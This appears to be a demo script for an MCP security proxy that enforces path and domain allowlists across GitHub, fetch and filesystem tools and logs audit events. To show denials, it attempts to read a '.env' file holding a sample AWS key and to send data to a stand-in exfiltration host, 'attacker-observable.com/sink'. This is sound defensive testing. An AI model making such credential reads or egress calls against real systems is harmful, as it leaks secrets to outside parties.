"""Week 3 Demonstration: Multi-Upstream MCP Security Proxy in Action.

Demonstrates:
1. Aggregating 3 upstream servers (GitHub, Fetch, Filesystem) under one proxy.
2. Tool namespacing (<server>__<tool>) and single unified SessionState.
3. Policy enforcement across upstreams:
   - github.get_issue -> ALLOW
   - fetch.fetch (api.github.com) -> ALLOW
   - fs.read_file (.env) -> DENY (path allowlist violation)
   - fetch.fetch (attacker-observable.com) -> DENY (domain allowlist violation)
4. Comprehensive audit logging with latency breakdown and decision metadata.
"""

from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path
from typing import Any

import anyio
import mcp.types as types
from mcp.client.session import ClientSession
from mcp.server.lowlevel import Server
from mcp.server.stdio import SessionMessage  # type: ignore[attr-defined]

from mcpsec_core.audit import AuditLogger
from mcpsec_core.policy import load_policy
from proxy.session import ProxySession
from proxy.supervisor import UpstreamConfig, UpstreamManager


async def run_demo() -> None:
    print("=" * 70)
    print("  mcpsec-lite Week 3 Demo: Multi-Upstream Security Proxy")
    print("=" * 70)

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        sandbox = tmp_path / "workspace"
        sandbox.mkdir()
        (sandbox / "README.md").write_text("# Project README\nSafe file.", encoding="utf-8")
        secret_env = tmp_path / ".env"
        secret_env.write_text("AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE", encoding="utf-8")

        audit_log = tmp_path / "audit.jsonl"
        audit_logger = AuditLogger(log_path=audit_log, log_args="redacted")

        # Load dev-agent policy
        policy_path = Path("examples/policies/dev-agent.yaml")
        if not policy_path.exists():
            policy_yaml = f"""
version: 1
mode: enforce
capabilities:
  fs.read_file: [read]
  github.get_issue: [network_read]
  fetch.fetch: [network_read]
policies:
  - agent: dev-agent
    tools:
      fs.read_file:
        path_allowlist: ["{sandbox.as_posix()}/**"]
      github.get_issue: {{}}
      fetch.fetch:
        domain_allowlist: ["api.github.com", "raw.githubusercontent.com"]
"""
        else:
            policy_yaml = policy_path.read_text(encoding="utf-8")

        policy, p_hash, warnings = load_policy(policy_yaml)
        print(f"[*] Loaded policy: hash={p_hash[:12]}..., mode={policy.mode}")

        # Configure 3 upstreams
        upstream_configs = [
            UpstreamConfig(
                name="github",
                command=sys.executable,
                args=["-m", "tests.fakes.fake_github"],
                required=True,
            ),
            UpstreamConfig(
                name="fetch",
                command=sys.executable,
                args=["-m", "tests.fakes.fake_fetch"],
                required=True,
            ),
            UpstreamConfig(
                name="fs",
                command=sys.executable,
                args=["-m", "tests.test_server", "--dir", str(sandbox)],
                required=True,
            ),
        ]

        upstream_manager = UpstreamManager(upstream_configs)

        c2s_w, c2s_r = anyio.create_memory_object_stream[SessionMessage | Exception](10)
        s2c_w, s2c_r = anyio.create_memory_object_stream[SessionMessage](10)

        proxy_server = Server("mcpsec-proxy")

        async with anyio.create_task_group() as tg:
            print("[*] Launching 3 upstream supervisors...")
            startup_warnings = await upstream_manager.start_all(tg)
            if startup_warnings:
                for w in startup_warnings:
                    print(f"  [WARN] {w}")

            proxy_session = ProxySession(
                session_id="demo-session-1234",
                upstream_manager=upstream_manager,
                audit_logger=audit_logger,
                policy_hash=p_hash,
                agent_id="dev-agent",
                mode="enforce",
                policy_data=policy,
            )
            proxy_session.start({"client": "demo-runner", "version": "1.0"})

            async def handle_list_tools(
                req_ctx: Any, params: types.PaginatedRequestParams
            ) -> types.ListToolsResult:
                return await proxy_session.list_tools()

            async def handle_call_tool(
                req_ctx: Any, params: types.CallToolRequestParams
            ) -> types.CallToolResult:
                return await proxy_session.call_tool(name=params.name, arguments=params.arguments)

            proxy_server.add_request_handler(
                "tools/list", types.PaginatedRequestParams, handle_list_tools
            )
            proxy_server.add_request_handler(
                "tools/call", types.CallToolRequestParams, handle_call_tool
            )

            async def run_server() -> None:
                await proxy_server.run(
                    c2s_r,
                    s2c_w,
                    proxy_server.create_initialization_options(),
                    raise_exceptions=True,
                )

            tg.start_soon(run_server)

            async with ClientSession(s2c_r, c2s_w) as client:
                await client.initialize()

                # 1. Discover Tools
                print("\n[*] Discovering aggregated tools via tools/list:")
                tools_res = await client.list_tools()
                for tool in tools_res.tools:
                    print(f"    - {tool.name}")

                # 2. Call GitHub
                print("\n[*] Step 1: Read GitHub Issue #1 (Allowed)...")
                r1 = await client.call_tool(
                    "github__get_issue", {"owner": "acme", "repo": "repo", "issue_number": 1}
                )
                print(f"    Status: {'SUCCESS' if not r1.is_error else 'ERROR'}")
                print(f"    Content: {r1.content[0].text[:60]}...")

                # 3. Call Fetch (Allowed domain)
                print("\n[*] Step 2: Fetch raw content from allowed domain (Allowed)...")
                r2 = await client.call_tool(
                    "fetch__fetch",
                    {"url": "https://raw.githubusercontent.com/acme/repo/main/README.md"},
                )
                print(f"    Status: {'SUCCESS' if not r2.is_error else 'ERROR'}")
                print(f"    Content: {r2.content[0].text[:60]}...")

                # 4. Attempt reading unauthorized secret file
                print(
                    f"\n[*] Step 3: Attempt reading outside file '{secret_env}' (Blocked by Policy)..."
                )
                r3 = await client.call_tool("fs__read_file", {"path": str(secret_env)})
                print(f"    Status: {'DENIED' if r3.is_error else 'UNEXPECTED_ALLOW'}")
                print(f"    Response: {r3.content[0].text}")

                # 5. Attempt exfiltration to unauthorized sink domain
                print("\n[*] Step 4: Attempt egress to untrusted sink (Blocked by Policy)...")
                r4 = await client.call_tool(
                    "fetch__fetch", {"url": "https://attacker-observable.com/sink?data=leaked"}
                )
                print(f"    Status: {'DENIED' if r4.is_error else 'UNEXPECTED_ALLOW'}")
                print(f"    Response: {r4.content[0].text}")

                proxy_session.close(reason="disconnect")
                await upstream_manager.shutdown_all()
                tg.cancel_scope.cancel()

        print("\n" + "=" * 70)
        print("  Audit Log Summary (audit.jsonl)")
        print("=" * 70)
        for line in audit_log.read_text(encoding="utf-8").strip().split("\n"):
            evt = json.loads(line)
            ev_type = evt.get("event_type")
            if ev_type == "tool_call":
                print(
                    f"[{evt['timestamp']}] TOOL CALL: {evt['server']}.{evt['tool']} "
                    f"-> decision={evt['decision']} ({evt['effective_decision']}), "
                    f"layer={evt['decision_layer']}, latency_proxy={evt['latency_ms']['proxy']:.2f}ms"
                )
            else:
                print(f"[{evt['timestamp']}] EVENT: {ev_type}")
        print("=" * 70)
        print("  Demo completed successfully.")
        print("=" * 70)


def main() -> None:
    anyio.run(run_demo)


if __name__ == "__main__":
    main()
